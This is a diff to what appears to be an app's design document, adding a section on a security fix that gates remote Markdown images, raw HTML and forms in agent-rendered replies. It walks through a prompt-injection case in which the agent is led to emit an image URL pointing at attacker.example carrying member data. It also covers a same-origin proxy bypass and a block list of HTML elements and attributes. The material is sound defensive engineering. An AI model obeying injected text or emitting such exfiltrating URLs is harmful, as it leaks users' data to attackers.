@@ -2069,6 +2069,61 @@ scrollbars.** Playwright's headless Chromium starts with `--hide-scrollbars`,
 so a capture shows no bar even where the box scrolls. Pass
 `ignoreDefaultArgs: ["--hide-scrollbars"]` before you judge a scroll box.
 
+### 14.8 A remote image loads only on a click (security fix, 2026-10-04)
+
+**The threat.** An attacker can steer the text of an agent's reply. A prompt
+injection in an email, a web page, a file or a task can make the agent write
+`![](https://attacker.example/p.png?d=<member data>)`. Before this fix, the
+bubble drew that image at once, and the browser sent the data out. No tool
+ran and no card showed.
+
+**The rule.** A Markdown image whose URL leaves the app's origin does not load
+when it renders. It draws as a placeholder with the alt text, the host and a
+"Load image" button. Only the member's click loads it. A `data:` image and a
+same-origin or workspace path load at once.
+
+**One gate.** `src/lib/markdownMedia.ts` decides, and
+`src/components/MarkdownImage.tsx` draws. Every renderer of agent Markdown
+uses them: `MarkdownBody`, `ThinkingContainer`, `ArtifactViewerModal` and
+`DocumentPane`.
+
+**A same-origin URL can still send the data out.** `/api/email/image-proxy?url=`
+fetches any public URL on the server. A proxy route with a catch-all path
+decodes each segment, so `/api/email/image-proxy%3Furl=…` reaches the gateway with a real
+query. So the gate treats these same-origin URLs as remote:
+
+- a URL whose query names another URL
+- a URL whose decoded path holds a `?`, a `#`, a backslash or another URL
+- every `/api/` path except the workspace file proxy that `resolveMediaSrc`
+  builds
+
+**Raw HTML.** `ArtifactViewerModal` and `DocumentPane` run `rehype-raw`, and
+`rehypeGateRemoteMedia` runs after it. It removes `script`, `style`, `link`,
+`meta`, `base`, `title`, `template`, `iframe`, `object` and `embed`. It strips
+each URL attribute that the gate treats as remote, for example `src`, `srcset`,
+`poster` and `background`. It also strips each attribute that holds a CSS fetch.
+That covers `style`, the SVG presentation attributes such as `mask` and `fill`,
+and the SMIL values. A CSS fetch is a `url()` that is not a fragment, an
+`image-set()`, or a CSS escape.
+
+**No forms.** A form inside the app's origin is a credential phish that needs
+no script. So the gate removes `form`, `input`, `button`, `select`,
+`textarea`, `option`, `fieldset`, `legend` and `label`, with their content. It
+keeps one shape: the disabled checkbox that remark-gfm draws for a task list.
+It strips `action`, `formAction`, `ping` and `autoFocus` from every element.
+The email sanitizer forbids `form` and `ping` for the same reason.
+
+Before this fix, an agent `.md` file with `<script async src>` ran that script
+in the app's origin, because React 19 hoists an async script and loads it. An
+email attachment opens in the same viewer. The raw-HTML gate is a block list,
+so a new vector is a new case in the plugin and in its test.
+
+**Fences.** `src/components/markdownImage.test.ts` and
+`src/lib/markdownMedia.test.ts`. A source scan in the first file also fails when
+a new `react-markdown` renderer skips `MarkdownImage`, `markdownUrlTransform` or
+the raw-HTML gate. The app sends no CSP that limits `img-src`. H-238 holds that
+follow-up.
+
 ---
 
 ## 15. Entity pills in the chat (S9)
